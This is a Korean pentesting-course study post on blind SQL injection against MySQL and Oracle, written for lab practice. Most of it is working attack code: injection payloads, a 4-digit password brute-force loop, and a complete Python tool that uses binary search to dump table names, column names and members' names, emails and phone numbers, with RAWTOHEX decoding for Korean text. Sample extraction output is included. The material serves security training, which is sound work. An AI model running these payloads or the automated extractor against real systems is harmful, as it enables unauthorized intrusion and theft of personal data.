---
title: "SQL Injection 심화 & Python 자동화 스크립트"
excerpt: "SQL Injection 공격 자동화와 이진 탐색 알고리즘을 활용한 효율적인 Blind SQLi 구현 방법"

categories: ['sk_pentesting']
typora-root-url: ../../

date: 2026-01-30
last_modified_at: 2026-01-30
published: true
tags: [sk-rookies, sql-injection, python, automation, blind-sqli, binary-search, requests, 모의해킹, SQL인젝션, 자동화]

---

## 1. SQL Injection 심화

### 1.1 MySQL Blind SQL Injection

#### 쿼리문 유추

검색 기능의 동작을 분석하여 서버 측 쿼리 구조를 파악한다.

```sql
-- 추정 쿼리문
SELECT 컬럼들 FROM 공지사항 WHERE 제목 LIKE '%검색어%'
```

- "애플"을 검색했을 때 "애플워치"가 나온다면 → `LIKE '%...%'` 패턴 사용 추정
- 검색어에 따옴표(`'`)를 넣어 에러 발생 여부 확인

#### 공격 포인트 찾기

```
검색어: '                    → 에러 또는 결과 없음 확인
검색어: cc%' or 'e'='q       → 문법 맞추기 테스트
검색어: cc%' and (공격쿼리) and 'e%'='e   → 실제 공격 포인트
```

**주의사항**
- 따옴표 입력 후 결과가 없을 때: 에러인지, 단순히 해당 데이터가 없는 건지 구분 필요
- 문법을 맞춰서 정상 결과와 비교해야 인젝션 가능 여부 판단 가능

#### 유저명 추출 과정

```sql
-- 1단계: 유저명 전체 길이 확인 (MySQL)
length(user()) > 0

-- user()는 '사용자@호스트' 형식으로 반환 (예: infos@192.168.123.123)
-- @ 앞부분만 추출하려면:
length(substring_index(user(),'@',1)) > 0

-- 2단계: 각 문자의 ASCII 값 추출
ascii(substr(user(),1,1)) > 0   -- 첫 번째 글자
ascii(substr(user(),2,1)) > 0   -- 두 번째 글자
```

**실습 결과 예시**

| 위치 | ASCII | 문자 |
|------|-------|------|
| 1 | 105 | i |
| 2 | 110 | n |
| 3 | 102 | f |
| 4 | 111 | o |
| 5 | 115 | s |

---

### 1.2 Oracle Blind SQL Injection (쇼핑몰 실습)

#### 핵심 차이점

| 구분 | MySQL | Oracle |
|------|-------|--------|
| 유저 함수 | `user()` | `user` (괄호 없음) |
| 문자열 자르기 | `substr()` | `substr()` |
| 시스템 테이블 | `information_schema` | `user_tables`, `user_tab_columns` |

#### 공격 포인트: 상품 상세 조회 페이지

검색창에만 집중하지 말 것! **조회 페이지의 ID 파라미터**도 공격 가능.

```
URL: /product/detail?id=61
```

**숫자형 인젝션 판별법**

```
id=62-1        → 61번 상품 출력되면 숫자형 (연산 수행됨)
id=62.0        → 62번 상품 출력되면 숫자형 (소수점 처리됨)
id=61'         → 에러 발생 (따옴표 불필요 확인)
```

숫자형은 따옴표 없이 바로 조건 추가 가능:

```sql
-- 공격 쿼리 형태
61 and length(user)>0
61 and ascii(substr(user,1,1)) > 0
```

#### 쿼리문 유추

```sql
-- 상품 목록 (검색)
SELECT 상품명, 설명... FROM 상품목록 WHERE 상품명 LIKE '%애플%'

-- 상품 상세 (조회) - 숫자형
SELECT 상품명, 가격, 상품설명... FROM 상품상세 WHERE 상품번호 = 61
```

---

### 1.3 개인정보 탈취 (보너스 문제)

**목표**: MEMBER 테이블에서 첫 번째 사용자의 이름, 이메일, 전화번호 추출

**Oracle에서 첫 번째 행 가져오기**

```sql
-- 서브쿼리 없이 간단하게
SELECT 컬럼명 FROM MEMBER WHERE ROWNUM=1
```

**추출 과정**
1. 테이블 개수 확인 → 테이블명 추출
2. 원하는 테이블에서 컬럼명 추출
3. 데이터 추출 (ROWNUM=1로 첫 번째 행)

---

## 2. requests 모듈 활용

### 2.1 기본 사용법

```python
import requests

# GET 요청
response = requests.get('https://www.naver.com')
print(response.status_code)  # 200
print(response.text)         # HTML 내용

# POST 요청
response = requests.post(url, headers=headers, cookies=cookies, data=data)
```

### 2.2 Burp Suite 요청을 Python으로 변환

**Burp Suite에서 캡처한 요청**

```http
POST /member/login HTTP/1.1
Host: example.com:8156
Cookie: JSESSIONID=ABC123...
Content-Type: application/x-www-form-urlencoded

userId=admin&userPw=0002&_csrf=xyz...
```

**Python 코드로 변환**

```python
import requests

url = "http://example.com:8156/member/login"

headers = {
    "Content-Type": "application/x-www-form-urlencoded"
}

cookies = {
    "JSESSIONID": "ABC123..."
}

data = {
    "userId": "admin",
    "userPw": "0002",
    "_csrf": "xyz..."
}

response = requests.post(url, headers=headers, cookies=cookies, data=data)
print(response.text)
```

**팁**
- Burp Suite에서 `우클릭 → Copy URL` 사용
- Content-Length는 자동 계산되므로 생략 가능
- User-Agent는 기본값(`python-requests/...`)으로 전송됨

---

## 3. 자동화 공격 스크립트

### 3.1 Brute Force 로그인 공격

**목표**: admin 계정의 4자리 숫자 비밀번호 찾기

**핵심 로직**

```python
for pw in range(0, 10000):
    password = str(pw).zfill(4)  # 0000 ~ 9999
    # 로그인 시도
    # "로그인에 실패했습니다"가 없으면 성공
```

**Zero-fill 처리**

```python
str(7).zfill(4)      # "0007"
str(879).zfill(4)    # "0879"
str(1234).zfill(4)   # "1234"
```

**성공/실패 판별**

```python
if "로그인에 실패했습니다" not in response.text:
    print(f"비밀번호 찾음: {password}")
    break
```

---

### 3.2 이진 탐색(Binary Search) 알고리즘

ASCII 값(1~127)을 순차 탐색하면 최대 127번 필요하지만, 이진 탐색은 **최대 8번**만에 찾을 수 있다.

#### 원리

```
목표값: 85 (문자 'U')

1차: 1~127 → 중간값 64 → 64보다 큼? 참 → 범위: 65~127
2차: 65~127 → 중간값 96 → 96보다 큼? 거짓 → 범위: 65~96
3차: 65~96 → 중간값 80 → 80보다 큼? 참 → 범위: 81~96
4차: 81~96 → 중간값 88 → 88보다 큼? 거짓 → 범위: 81~88
5차: 81~88 → 중간값 84 → 84보다 큼? 참 → 범위: 85~88
6차: 85~88 → 중간값 86 → 86보다 큼? 거짓 → 범위: 85~86
7차: 85~86 → 중간값 85 → 85보다 큼? 거짓 → 범위: 85~85
8차: 시작점 = 끝점 = 85 → 찾음!
```

#### 기본 구현

```python
def binary_search_ascii(check_function):
    """
    check_function: 중간값보다 큰지 확인하는 함수 (True/False 반환)
    """
    start = 1
    end = 127

    while start < end:
        mid = (start + end) // 2

        if check_function(mid):  # mid보다 크면
            start = mid + 1      # 오른쪽 절반
        else:
            end = mid            # 왼쪽 절반 (mid 포함)

    return start  # 또는 end (둘이 같음)
```

#### 경계 조건 주의사항

| 비교 연산 | start 업데이트 | end 업데이트 |
|----------|---------------|-------------|
| `> mid` (초과) | `start = mid + 1` | `end = mid` |
| `>= mid` (이상) | `start = mid` | `end = mid - 1` |

**이 경계 처리를 잘못하면 무한루프에 빠지거나 값이 1씩 틀어진다!**

---

### 3.3 Blind SQL Injection 자동화

#### 전체 흐름

```
1. 글자수 추출: length(user) > N
2. 각 글자의 ASCII 추출: ascii(substr(user,위치,1)) > N
3. ASCII → 문자 변환: chr(ascii값)
4. 결과 조합
```

#### 참/거짓 판별 기준

```python
def is_true(query):
    """쿼리 실행 결과가 참인지 확인"""
    url = f"http://target.com/product?id=61 and {query}"
    response = requests.get(url, cookies=cookies)

    # 참이면 정상 데이터 출력, 거짓이면 데이터 없음
    return "MacBook" in response.text
```

#### 이진 탐색 적용 예시

```python
def get_ascii_binary(position):
    """특정 위치의 ASCII 값을 이진 탐색으로 찾기"""
    start = 1
    end = 127

    while start < end:
        mid = (start + end) // 2
        query = f"ascii(substr(user,{position},1)) > {mid}"

        if is_true(query):
            start = mid + 1
        else:
            end = mid

    return start

# 사용
first_char = chr(get_ascii_binary(1))  # 첫 번째 글자
```

#### 함수화를 통한 재사용

```python
def 문자열_추출(쿼리, 길이=None, ascii_범위=(32, 126)):
    """
    문자열을 추출하는 범용 함수

    Parameters:
        쿼리: SQL 쿼리 또는 Oracle 함수 (예: "user" 또는 "select table_name from...")
        길이: 문자열 길이 (None이면 자동 계산)
        ascii_범위: ASCII 범위 튜플 (기본값: 32-126, 출력 가능한 문자)

    Returns:
        추출된 문자열
    """
    # 1. 길이 자동 계산
    if 길이 is None:
        if 쿼리.strip().startswith("select"):
            # 서브쿼리인 경우 괄호로 감싸기
            길이_쿼리 = f"length(({쿼리}))"
        else:
            길이_쿼리 = f"length({쿼리})"

        길이 = 이진탐색(길이_쿼리, 0, 4000)
        if not 길이:
            return None

    # 2. 각 문자의 ASCII 값 추출
    결과 = ""
    for 위치 in range(1, 길이 + 1):
        if 쿼리.strip().startswith("select"):
            아스키_쿼리 = f"ascii(substr(({쿼리}),{위치},1))"
        else:
            아스키_쿼리 = f"ascii(substr({쿼리},{위치},1))"

        아스키 = 이진탐색(아스키_쿼리, ascii_범위[0], ascii_범위[1])
        if not 아스키:
            return None

        결과 += chr(아스키)
        print(f"  추출 중... {결과}", end='\r')

    print()
    return 결과


# 사용 예시
# 1. 단순 함수 호출
사용자명 = 문자열_추출("user")
print(f"DB 사용자: {사용자명}")  # SCOTT

# 2. 서브쿼리 사용
테이블명 = 문자열_추출("select table_name from user_tables where rownum=1")
print(f"첫 번째 테이블: {테이블명}")  # MEMBER

# 3. 대문자만 있는 경우 (ASCII 범위 제한으로 속도 향상)
테이블명 = 문자열_추출("select table_name from user_tables where rownum=1",
                     ascii_범위=(65, 90))  # A-Z만
print(f"테이블명: {테이블명}")  # MEMBER
```

#### 이진탐색 핵심 함수

```python
def 이진탐색(쿼리, 시작=1, 끝=127):
    """
    이진 탐색으로 값 추출

    Parameters:
        쿼리: 비교할 SQL 쿼리 (예: "length(user)" 또는 "ascii(substr(user,1,1))")
        시작: 탐색 시작 값
        끝: 탐색 끝 값

    Returns:
        찾은 값
    """
    시작점 = 시작
    끝점 = 끝

    while 시작점 < 끝점:
        중간점 = (시작점 + 끝점) // 2

        # SQL Injection 페이로드 구성
        주소 = f"{베이스_URL}?id=61 and ({쿼리}) > {중간점}"

        try:
            응답 = requests.get(url=주소, cookies=쿠키, timeout=10)

            # 참/거짓 판별 (정상 데이터가 보이면 참)
            if "MacBook" in 응답.text:
                시작점 = 중간점 + 1  # 중간값보다 크다
            else:
                끝점 = 중간점  # 중간값보다 작거나 같다

        except requests.exceptions.RequestException as e:
            print(f"[!] 요청 실패: {e}")
            return None

    return 시작점
```

---

## 5. AI 활용 팁

### 올바른 활용법

```
잘못된 방식
"이거 어떻게 해야 돼?" → AI가 시키는 대로 따라하기

올바른 방식
내가 로직을 설계 → AI에게 코드 생성 요청 → 결과 검증 및 수정
```

### 핵심 원칙

1. **내가 주도적으로 끌고 가기**: AI가 나를 시켜먹는 게 아니라, 내가 AI를 활용
2. **코드 이해 필수**: AI가 만든 코드를 보고 "이거 틀린 것 같은데"라고 말할 수 있어야 함
3. **프롬프트 품질**: 좋은 프롬프트 = 좋은 결과

### 손코딩 vs AI 코딩

```
손으로 열심히 코딩한 것 ≈ AI에게 잘 지시해서 받은 것

차이가 없는 세상이 되었다.
하지만 AI가 잘못된 방향으로 가고 있는지 판단하려면
기본 원리를 알아야 한다.
```

---

## 6. 한글 데이터 추출 (RAWTOHEX 활용)

### 6.1 문제점

Oracle에서 한글 데이터 추출 시 ASCII가 아닌 멀티바이트 처리가 필요하다.

```
예시: "김세웅"
UTF-8 인코딩: %EA%B9%80 %EC%84%B8 %EC%9A%A9
16진수: 0xEAB980 0xEC84B8 0xEC9AA9
```

한글 1글자 = 3바이트 → ASCII로는 직접 추출 불가

### 6.2 해결 방법: RAWTOHEX 함수

Oracle의 `RAWTOHEX()` 함수를 사용하면 모든 문자를 16진수로 변환하여 추출할 수 있다.

```python
def HEX_추출(쿼리):
    """RAWTOHEX로 변환된 데이터 추출 (한글 지원)"""
    # 1. HEX 문자열 길이 확인
    if 쿼리.strip().startswith("select"):
        hex_길이_쿼리 = f"length(RAWTOHEX(({쿼리})))"
    else:
        hex_길이_쿼리 = f"length(RAWTOHEX({쿼리}))"

    hex_길이 = 이진탐색(hex_길이_쿼리, 1, 4000)

    if not hex_길이:
        return ""

    # 2. HEX 문자열 한 글자씩 추출
    hex_문자열 = ""
    for 위치 in range(1, hex_길이 + 1):
        if 쿼리.strip().startswith("select"):
            아스키_쿼리 = f"ascii(substr(RAWTOHEX(({쿼리})),{위치},1))"
        else:
            아스키_쿼리 = f"ascii(substr(RAWTOHEX({쿼리}),{위치},1))"

        # HEX는 0-9, A-F만 사용 (ASCII 48-70)
        아스키 = 이진탐색(아스키_쿼리, 48, 70)

        if not 아스키:
            return None

        hex_문자열 += chr(아스키)

        if 위치 % 10 == 0:
            print(f"  HEX 추출 중... {위치}/{hex_길이}", end='\r')

    print()

    # 3. HEX 문자열을 바이트로 변환 후 UTF-8 디코딩
    try:
        바이트_데이터 = bytes.fromhex(hex_문자열)
        return 바이트_데이터.decode('utf-8')
    except Exception as e:
        print(f"[!] 디코딩 실패: {e}")
        return hex_문자열
```

### 6.3 사용 예시

```python
# ASCII만 있는 데이터
쿼리 = "select EMAIL from MEMBER where ROWNUM=1"
이메일 = 문자열_추출(쿼리)  # 일반 방식 사용
print(f"이메일: {이메일}")  # admin@example.com

# 한글이 포함된 데이터
쿼리 = "select NAME from MEMBER where ROWNUM=1"
이름 = HEX_추출(쿼리)  # HEX 방식 사용
print(f"이름: {이름}")  # 김철수
```

### 6.4 자동 감지 방식

한글 여부를 모를 때는 HEX 방식을 먼저 시도하고, 실패하면 ASCII 방식으로 재시도한다.

```python
def 데이터_추출(테이블명, 컬럼명, 행번호):
    """특정 행의 데이터 추출 (한글 자동 감지)"""
    쿼리 = f"select {컬럼명} from (select {컬럼명}, rownum as rn from {테이블명}) where rn={행번호}"

    # 먼저 HEX 방식으로 시도 (한글 지원)
    print("  [*] HEX 방식으로 추출 중...")
    hex_데이터 = HEX_추출(쿼리)

    # HEX 추출 성공 시 반환
    if hex_데이터 and hex_데이터 != "":
        return hex_데이터

    # HEX 실패 시 일반 ASCII로 재시도
    print("  [*] ASCII 방식으로 재시도...")
    return 문자열_추출(쿼리)
```
---

## 7. 실전 예제: 완전한 자동화 스크립트

### 7.1 전체 구조

```python
"""
Oracle Blind SQL Injection - 자동화 도구
"""
import requests

# ============================================
# 설정
# ============================================
쿠키 = {
    "JSESSIONID": "YOUR_SESSION_ID"
}

베이스_URL = "http://target.com/product/detail"
기본_ID = 61
참_문자열 = "MacBook"  # 정상 응답에 포함되는 문자열


# ============================================
# 핵심 함수 (위에서 정의한 함수들)
# ============================================
def 이진탐색(쿼리, 시작=1, 끝=127):
    # ... (위 코드 참고)
    pass

def 문자열_추출(쿼리, 길이=None, ascii_범위=(32, 126)):
    # ... (위 코드 참고)
    pass

def HEX_추출(쿼리):
    # ... (위 코드 참고)
    pass


# ============================================
# 메타데이터 수집
# ============================================
def 테이블명_추출(인덱스):
    """N번째 테이블 이름 추출 (MIN_NOT_IN 방식)"""
    제외_목록 = []

    # 이전 테이블들 수집
    for i in range(1, 인덱스):
        if not 제외_목록:
            쿼리 = "select min(table_name) from user_tables"
        else:
            not_in_부분 = ",".join([f"'{t}'" for t in 제외_목록])
            쿼리 = f"select min(table_name) from user_tables where table_name not in ({not_in_부분})"

        테이블명 = 문자열_추출(쿼리)
        if 테이블명:
            제외_목록.append(테이블명)

    # N번째 테이블 추출
    if 제외_목록:
        not_in_부분 = ",".join([f"'{t}'" for t in 제외_목록])
        최종_쿼리 = f"select min(table_name) from user_tables where table_name not in ({not_in_부분})"
    else:
        최종_쿼리 = "select min(table_name) from user_tables"

    return 문자열_추출(최종_쿼리)


def 컬럼명_추출(테이블명, 인덱스):
    """특정 테이블의 N번째 컬럼 이름 추출"""
    쿼리 = f"select column_name from (select column_name, rownum as rn from user_tab_columns where table_name='{테이블명}') where rn={인덱스}"
    return 문자열_추출(쿼리)


def 데이터_추출(테이블명, 컬럼명, 행번호):
    """특정 행의 데이터 추출 (한글 자동 감지)"""
    쿼리 = f"select {컬럼명} from (select {컬럼명}, rownum as rn from {테이블명}) where rn={행번호}"

    # HEX 방식 먼저 시도 (한글 지원)
    hex_데이터 = HEX_추출(쿼리)
    if hex_데이터:
        return hex_데이터

    # 실패 시 ASCII 방식
    return 문자열_추출(쿼리)


# ============================================
# 빠른 테스트
# ============================================
def 빠른_테스트():
    """MEMBER 테이블의 첫 번째 행 추출"""
    print("="*70)
    print(" 빠른 데이터 추출 테스트")
    print("="*70)

    테이블명 = "MEMBER"
    컬럼_목록 = ["NAME", "EMAIL", "PHONE"]
    행번호 = 1

    print(f"\n[*] 테이블 '{테이블명}' - 행 {행번호} 추출\n")

    결과 = {}
    for 컬럼 in 컬럼_목록:
        print(f"[*] 컬럼 '{컬럼}' 추출 중...")
        값 = 데이터_추출(테이블명, 컬럼, 행번호)
        결과[컬럼] = 값
        print(f"[+] {컬럼}: {값}\n")

    print("="*70)
    print("추출 완료:")
    print("="*70)
    for 컬럼, 값 in 결과.items():
        print(f"  {컬럼}: {값}")


if __name__ == "__main__":
    빠른_테스트()
```

### 7.2 실행 결과 예시

```
======================================================================
 빠른 데이터 추출 테스트
======================================================================

[*] 테이블 'MEMBER' - 행 1 추출

[*] 컬럼 'NAME' 추출 중...
  [*] HEX 방식으로 추출 중...
  HEX 추출 중... 18/18
[+] NAME: 김철수

[*] 컬럼 'EMAIL' 추출 중...
  [*] HEX 방식으로 추출 중...
  HEX 추출 중... 34/34
[+] EMAIL: admin@example.com

[*] 컬럼 'PHONE' 추출 중...
  [*] HEX 방식으로 추출 중...
  HEX 추출 중... 26/26
[+] PHONE: 010-1234-5678

======================================================================
추출 완료:
======================================================================
  NAME: 김철수
  EMAIL: admin@example.com
  PHONE: 010-1234-5678
```

### 7.3 성능 최적화 팁

1. **ASCII 범위 제한**
   ```python
   # 대문자만 있는 테이블명 (A-Z)
   테이블명 = 문자열_추출(쿼리, ascii_범위=(65, 90))

   # 숫자만 있는 데이터 (0-9)
   번호 = 문자열_추출(쿼리, ascii_범위=(48, 57))
   ```

2. **병렬 처리**
   ```python
   from concurrent.futures import ThreadPoolExecutor

   def 병렬_컬럼_추출(테이블명, 컬럼_목록, 행번호):
       with ThreadPoolExecutor(max_workers=3) as executor:
           futures = {executor.submit(데이터_추출, 테이블명, 컬럼, 행번호): 컬럼
                     for 컬럼 in 컬럼_목록}

           결과 = {}
           for future in futures:
               컬럼 = futures[future]
               결과[컬럼] = future.result()

       return 결과
   ```

3. **요청 속도 제어**
   ```python
   import time

   def 이진탐색(쿼리, 시작=1, 끝=127):
       # ...
       time.sleep(0.1)  # 서버 부하 방지
       응답 = requests.get(...)
       # ...
   ```

---

## 8. 핵심 정리

| 주제 | 핵심 내용 |
|------|----------|
| 공격 포인트 | 검색창뿐 아니라 조회 페이지 ID 파라미터도 확인 |
| 숫자형 판별 | 연산(`62-1`), 소수점(`62.0`) 테스트 |
| MySQL vs Oracle | `user()` vs `user`, 시스템 테이블 차이 |
| 이진 탐색 | 127번 → 8번으로 속도 개선 |
| 자동화 핵심 | 참/거짓 판별 기준 명확히 설정 |
| AI 활용 | 원리 이해 → 주도적 활용 → 결과 검증 |
| 한글 처리 | RAWTOHEX 함수로 HEX 변환 후 UTF-8 디코딩 |
